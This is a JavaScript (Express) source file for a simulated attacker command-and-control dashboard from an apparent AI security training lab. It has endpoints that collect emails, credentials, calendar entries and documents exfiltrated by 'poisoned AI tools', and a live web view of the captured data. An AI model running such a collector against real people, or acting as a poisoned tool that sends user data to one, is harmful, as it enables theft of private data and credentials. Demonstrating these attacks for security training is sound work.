/**
 * ATTACKER DASHBOARD
 * ==================
 * Simulates an attacker's C2 server that receives exfiltrated data.
 * Shows data in real-time as it's "stolen" by poisoned AI tools.
 */

const express = require('express');
const cors = require('cors');
const http = require('http');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const server = http.createServer(app);

// =============================================================================
// Data Storage (in-memory for demo)
// =============================================================================

const exfiltratedData = [];
const MAX_ENTRIES = 100;

// SSE clients for real-time updates
const sseClients = [];

function broadcastToClients(data) {
  const message = `data: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach(client => {
    client.write(message);
  });
}

// =============================================================================
// Exfiltration Endpoints (what the poisoned AI would call)
// =============================================================================

// Generic data receiver
app.post('/collect', (req, res) => {
  const entry = {
    id: Date.now(),
    timestamp: new Date().toISOString(),
    type: 'generic',
    source: req.headers['x-source'] || 'unknown',
    userAgent: req.headers['user-agent'],
    ip: req.ip,
    data: req.body
  };
  
  exfiltratedData.unshift(entry);
  if (exfiltratedData.length > MAX_ENTRIES) exfiltratedData.pop();
  
  broadcastToClients(entry);
  console.log('[EXFIL]', JSON.stringify(entry));
  
  res.json({ status: 'received' });
});

// Email exfiltration endpoint
app.post('/email-collector', (req, res) => {
  const entry = {
    id: Date.now(),
    timestamp: new Date().toISOString(),
    type: 'email',
    source: req.headers['x-source'] || 'ai-assistant',
    data: {
      to: req.body.to,
      subject: req.body.subject,
      body: req.body.body,
      originalSender: req.body.originalSender,
      metadata: req.body.metadata
    }
  };
  
  exfiltratedData.unshift(entry);
  if (exfiltratedData.length > MAX_ENTRIES) exfiltratedData.pop();
  
  broadcastToClients(entry);
  console.log('[EXFIL:EMAIL]', JSON.stringify(entry));
  
  res.json({ status: 'received', message: 'Email data collected' });
});

// Credential exfiltration endpoint
app.post('/cred-collector', (req, res) => {
  const entry = {
    id: Date.now(),
    timestamp: new Date().toISOString(),
    type: 'credentials',
    source: req.headers['x-source'] || 'phishing',
    data: {
      username: req.body.username || req.body.email,
      password: req.body.password,
      service: req.body.service,
      additionalInfo: req.body
    }
  };
  
  exfiltratedData.unshift(entry);
  if (exfiltratedData.length > MAX_ENTRIES) exfiltratedData.pop();
  
  broadcastToClients(entry);
  console.log('[EXFIL:CREDS]', JSON.stringify(entry));
  
  res.json({ status: 'received', message: 'Credentials logged' });
});

// Calendar/meeting exfiltration
app.post('/calendar-collector', (req, res) => {
  const entry = {
    id: Date.now(),
    timestamp: new Date().toISOString(),
    type: 'calendar',
    source: req.headers['x-source'] || 'ai-assistant',
    data: req.body
  };
  
  exfiltratedData.unshift(entry);
  if (exfiltratedData.length > MAX_ENTRIES) exfiltratedData.pop();
  
  broadcastToClients(entry);
  console.log('[EXFIL:CALENDAR]', JSON.stringify(entry));
  
  res.json({ status: 'received' });
});

// Document/file exfiltration
app.post('/doc-collector', (req, res) => {
  const entry = {
    id: Date.now(),
    timestamp: new Date().toISOString(),
    type: 'document',
    source: req.headers['x-source'] || 'ai-assistant',
    data: {
      filename: req.body.filename,
      content: req.body.content,
      metadata: req.body.metadata
    }
  };
  
  exfiltratedData.unshift(entry);
  if (exfiltratedData.length > MAX_ENTRIES) exfiltratedData.pop();
  
  broadcastToClients(entry);
  console.log('[EXFIL:DOC]', JSON.stringify(entry));
  
  res.json({ status: 'received' });
});

// =============================================================================
// Dashboard API
// =============================================================================

// Get all exfiltrated data
app.get('/api/data', (req, res) => {
  res.json({
    count: exfiltratedData.length,
    entries: exfiltratedData
  });
});

// Clear data
app.delete('/api/data', (req, res) => {
  exfiltratedData.length = 0;
  broadcastToClients({ type: 'clear' });
  res.json({ status: 'cleared' });
});

// SSE endpoint for real-time updates
app.get('/api/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  
  sseClients.push(res);
  
  // Send initial data
  res.write(`data: ${JSON.stringify({ type: 'connected', count: exfiltratedData.length })}\n\n`);
  
  req.on('close', () => {
    const index = sseClients.indexOf(res);
    if (index !== -1) sseClients.splice(index, 1);
  });
});

// =============================================================================
// Dashboard UI
// =============================================================================

app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>☠️ Attacker Dashboard</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: 'Courier New', monospace;
      background: #0a0a0a;
      color: #00ff00;
      margin: 0;
      padding: 20px;
    }
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #00ff00;
      padding-bottom: 10px;
      margin-bottom: 20px;
    }
    h1 {
      margin: 0;
      color: #ff0000;
    }
    .status {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .status-dot {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      background: #00ff00;
      animation: pulse 1s infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .stats {
      display: flex;
      gap: 30px;
      margin-bottom: 20px;
    }
    .stat {
      background: #1a1a1a;
      padding: 15px 25px;
      border: 1px solid #333;
    }
    .stat-value {
      font-size: 2em;
      color: #ff0000;
    }
    .stat-label {
      color: #666;
      font-size: 0.9em;
    }
    .entries {
      max-height: 70vh;
      overflow-y: auto;
    }
    .entry {
      background: #111;
      border: 1px solid #333;
      margin-bottom: 10px;
      padding: 15px;
      animation: fadeIn 0.3s;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .entry-header {
      display: flex;
      justify-content: space-between;
      margin-bottom: 10px;
      padding-bottom: 10px;
      border-bottom: 1px solid #333;
    }
    .entry-type {
      background: #ff0000;
      color: #000;
      padding: 2px 8px;
      font-weight: bold;
    }
    .entry-type.email { background: #ff6600; }
    .entry-type.credentials { background: #ff0000; }
    .entry-type.calendar { background: #9900ff; }
    .entry-type.document { background: #0099ff; }
    .entry-time {
      color: #666;
    }
    .entry-data {
      white-space: pre-wrap;
      word-break: break-all;
      color: #00cc00;
      font-size: 0.9em;
    }
    .clear-btn {
      background: #ff0000;
      color: #000;
      border: none;
      padding: 10px 20px;
      cursor: pointer;
      font-family: inherit;
      font-weight: bold;
    }
    .clear-btn:hover {
      background: #cc0000;
    }
    .empty {
      color: #666;
      text-align: center;
      padding: 50px;
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>☠️ ATTACKER C2 DASHBOARD</h1>
    <div class="status">
      <div class="status-dot"></div>
      <span>LISTENING</span>
      <button class="clear-btn" onclick="clearData()">CLEAR ALL</button>
    </div>
  </div>
  
  <div class="stats">
    <div class="stat">
      <div class="stat-value" id="total-count">0</div>
      <div class="stat-label">TOTAL CAPTURED</div>
    </div>
    <div class="stat">
      <div class="stat-value" id="email-count">0</div>
      <div class="stat-label">EMAILS</div>
    </div>
    <div class="stat">
      <div class="stat-value" id="cred-count">0</div>
      <div class="stat-label">CREDENTIALS</div>
    </div>
    <div class="stat">
      <div class="stat-value" id="doc-count">0</div>
      <div class="stat-label">DOCUMENTS</div>
    </div>
  </div>
  
  <div class="entries" id="entries">
    <div class="empty">Waiting for exfiltrated data...</div>
  </div>

  <script>
    let entries = [];
    
    function updateStats() {
      document.getElementById('total-count').textContent = entries.length;
      document.getElementById('email-count').textContent = entries.filter(e => e.type === 'email').length;
      document.getElementById('cred-count').textContent = entries.filter(e => e.type === 'credentials').length;
      document.getElementById('doc-count').textContent = entries.filter(e => e.type === 'document').length;
    }
    
    function renderEntries() {
      const container = document.getElementById('entries');
      if (entries.length === 0) {
        container.innerHTML = '<div class="empty">Waiting for exfiltrated data...</div>';
        return;
      }
      
      container.innerHTML = entries.map(entry => \`
        <div class="entry">
          <div class="entry-header">
            <span class="entry-type \${entry.type}">\${entry.type.toUpperCase()}</span>
            <span class="entry-time">\${entry.timestamp}</span>
          </div>
          <div class="entry-data">\${JSON.stringify(entry.data, null, 2)}</div>
        </div>
      \`).join('');
    }
    
    function addEntry(entry) {
      entries.unshift(entry);
      if (entries.length > 100) entries.pop();
      updateStats();
      renderEntries();
    }
    
    async function clearData() {
      await fetch('/api/data', { method: 'DELETE' });
      entries = [];
      updateStats();
      renderEntries();
    }
    
    // Load initial data
    fetch('/api/data')
      .then(r => r.json())
      .then(data => {
        entries = data.entries;
        updateStats();
        renderEntries();
      });
    
    // Connect to SSE for real-time updates
    const eventSource = new EventSource('/api/stream');
    eventSource.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.type === 'clear') {
        entries = [];
        updateStats();
        renderEntries();
      } else if (data.type !== 'connected') {
        addEntry(data);
      }
    };
  </script>
</body>
</html>
  `);
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', service: 'attacker-dashboard', capturedEntries: exfiltratedData.length });
});

// =============================================================================
// Start Server
// =============================================================================

const PORT = process.env.PORT || 6060;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════════════════════════╗
║  ☠️  ATTACKER DASHBOARD - AI Security Training Lab            ║
║  Simulated C2 server for exfiltration demonstrations         ║
╠══════════════════════════════════════════════════════════════╣
║  Dashboard: http://localhost:${PORT}                             ║
║                                                              ║
║  Exfiltration Endpoints:                                     ║
║    POST /collect           - Generic data                    ║
║    POST /email-collector   - Email data                      ║
║    POST /cred-collector    - Credentials                     ║
║    POST /calendar-collector - Calendar events                ║
║    POST /doc-collector     - Documents                       ║
║                                                              ║
║  Dashboard API:                                              ║
║    GET  /api/data   - View captured data                     ║
║    GET  /api/stream - SSE real-time feed                     ║
╚══════════════════════════════════════════════════════════════╝
  `);
});
